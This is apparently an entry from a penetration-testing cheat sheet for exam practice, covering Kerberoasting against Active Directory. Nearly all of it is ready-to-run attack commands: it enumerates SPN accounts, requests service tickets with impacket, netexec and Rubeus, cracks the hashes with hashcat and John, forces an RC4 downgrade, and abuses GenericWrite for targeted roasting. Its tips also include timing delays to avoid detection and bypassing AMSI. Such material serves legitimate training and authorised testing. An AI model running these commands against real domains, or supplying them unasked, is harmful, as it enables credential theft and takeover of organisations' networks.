title: Kerberoasting — Service Ticket Crack
body: Any domain user can request a TGS for any SPN-enabled account. The returned ticket is encrypted with the service account's password hash — crack it offline for plaintext. Service accounts often have weak, rarely-rotated passwords. Huge exam win when SPN accounts exist. Doesn't need admin. Doesn't cause lockouts.
cmd:
# ══════════════════════════════════════════════════
# STEP 1: FIND KERBEROASTABLE ACCOUNTS
# ══════════════════════════════════════════════════
# Any SPN-enabled user account = Kerberoastable
# Computer accounts have 240-byte random passwords (don't bother)

# -- From Kali (impacket) --------------------------
impacket-GetUserSPNs domain.com/user:'pass' -dc-ip $ip
# Just lists SPN users, doesn't request tickets

# -- From Kali (netexec) ---------------------------
nxc ldap $ip -u user -p 'pass' --kerberoasting out.txt
# Dumps all SPN hashes in one shot — modern one-liner

# -- From Windows (PowerView) ----------------------
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -SPN | select samaccountname,memberof

# -- From Windows (Rubeus stats — no tickets pulled) --
.\Rubeus.exe kerberoast /stats
# Shows AES vs RC4 coverage, password-last-set ages
# Use this to pick low-hanging targets BEFORE roasting

# -- Built-in (setspn — no tools needed) -----------
setspn.exe -Q */*

# ══════════════════════════════════════════════════
# STEP 2: REQUEST THE TICKETS
# ══════════════════════════════════════════════════

# -- Kali: impacket (OSCP exam go-to) --------------
impacket-GetUserSPNs domain.com/user:'pass' \
  -dc-ip $ip -request -outputfile tgs.txt

# With NT hash instead of password:
impacket-GetUserSPNs -hashes :NTHASH domain.com/user \
  -dc-ip $ip -request -outputfile tgs.txt

# Target a specific user only (less noisy):
impacket-GetUserSPNs domain.com/user:'pass' \
  -dc-ip $ip -request-user svc_sql -outputfile tgs.txt

# -- Kali: netexec one-liner -----------------------
nxc ldap $ip -u user -p 'pass' --kerberoasting tgs.txt

# -- Windows: Rubeus (in-memory, no touching disk) --
.\Rubeus.exe kerberoast /outfile:tgs.txt
.\Rubeus.exe kerberoast /nowrap                     # print to console
.\Rubeus.exe kerberoast /user:svc_sql /nowrap       # single user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1'  # only privileged

# Rubeus with delay to avoid detection:
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /outfile:tgs.txt

# Alternate creds (useful when RDP'd as different user):
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:'pass' /outfile:tgs.txt

# ══════════════════════════════════════════════════
# STEP 3: CRACK THE HASHES
# ══════════════════════════════════════════════════
# Hash format determines hashcat mode:
# $krb5tgs$23$*  = RC4-HMAC    → mode 13100 (FASTEST to crack)
# $krb5tgs$17$*  = AES128      → mode 19600
# $krb5tgs$18$*  = AES256      → mode 19700 (SLOWEST)

# Check what you got:
head -c 15 tgs.txt

# -- Hashcat --------------------------------------
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt  # AES256

# With rules (service accounts often have predictable passwords):
hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Show cracked results:
hashcat -m 13100 tgs.txt --show

# -- John the Ripper (alternative) -----------------
john --format=krb5tgs --wordlist=rockyou.txt tgs.txt

# ══════════════════════════════════════════════════
# AES-ONLY ENVIRONMENTS — RC4 DOWNGRADE
# ══════════════════════════════════════════════════
# Modern domains enforce AES — AES hashes take 100x longer to crack
# If targeting DC Server 2016 or earlier, force RC4:

# Rubeus /tgtdeleg trick (requests RC4 even if AES enabled):
.\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs.rc4
# WARNING: Does NOT work on Server 2019+ DCs

# pypykatz with forced RC4 etype:
pypykatz kerberos spnroast -d domain.com -t svc_sql -e 23 \
  'kerberos+password://DOMAIN\\user:pass@$ip'

# Rubeus explicit AES-only roasting:
.\Rubeus.exe kerberoast /aes /outfile:tgs.aes

# ══════════════════════════════════════════════════
# TARGETED KERBEROAST — when no SPNs exist
# ══════════════════════════════════════════════════
# If you have GenericWrite/GenericAll over a user:
#   1. Add an SPN to their account
#   2. Request TGS for that SPN
#   3. Remove the SPN
# Makes ANY controllable user Kerberoastable

# Modern tool — automates all 3 steps:
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast && pip install -r requirements.txt
python3 targetedKerberoast.py -d domain.com -u controller -p 'pass'
# Auto-detects which users you can write to, adds/requests/removes

# Manual version (PowerView on Windows):
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}
.\Rubeus.exe kerberoast /user:victim /nowrap
Set-DomainObject -Identity victim -Clear serviceprincipalname

# Manual version (bloodyAD on Linux):
bloodyAD -d domain.com -u controller -p 'pass' --host $ip \
  set object victim servicePrincipalName -v 'fake/x'
impacket-GetUserSPNs domain.com/controller:'pass' -dc-ip $ip \
  -request-user victim -outputfile tgs.txt
bloodyAD -d domain.com -u controller -p 'pass' --host $ip \
  remove object victim servicePrincipalName -v 'fake/x'

# ══════════════════════════════════════════════════
# KERBEROAST WITHOUT DOMAIN CREDS
# ══════════════════════════════════════════════════
# If an AS-REP roastable user exists (no preauth required),
# can roast services using only a user list — no password needed

# impacket (requires -no-preauth user):
impacket-GetUserSPNs -no-preauth 'asrep_user' \
  -usersfile users.txt -dc-host dc.domain.com domain.com/

# netexec:
nxc ldap $ip -u asrep_user -p '' \
  --no-preauth-targets users.txt --kerberoasting out.txt

# ══════════════════════════════════════════════════
# COMMON EXAM-DAY GOTCHAS
# ══════════════════════════════════════════════════
# Clock skew error (KRB_AP_ERR_SKEW):
#   sudo ntpdate $dc_ip                      # sync time to DC
#   sudo rdate -n $dc_ip                     # alternative
#
# No hash in output (got empty tgs.txt):
#   - Account has NO SPN set — check with ldapsearch
#   - Account is disabled — look for UserAccountControl flag
#
# Got hash but won't crack:
#   - Check encryption type ($krb5tgs$17/18 = AES, try mode 19600/19700)
#   - Service account may have strong random password (gMSA, managed)
#   - Try bigger wordlist: rockyou + rules, or crackstation dumps
#
# Password policy shows no lockout but DC locks you out anyway:
#   - Different policy on DC vs domain — use nxc --pass-pol FIRST
warn: Service accounts often have passwords like 'ServiceName2023!' or the company name — try custom wordlists first. Rubeus is AMSI-flagged on modern Windows — use obfuscated build or bypass AMSI first. AES hashes (mode 19700) are ~100x slower to crack than RC4 (mode 13100) — don't waste exam time if AES shows up. targetedKerberoast.py is the modern way for GenericWrite abuse — faster than the 3-step manual process. Clock skew is the #1 failure mode on Kali — sync time to the DC before you do anything Kerberos.

choices.label: Cracked service account hash — pivot to shell
Got hash but won't crack — try AS-REP roast
No SPN users found — check GenericWrite (targeted)
Service account is local admin — lateral movement
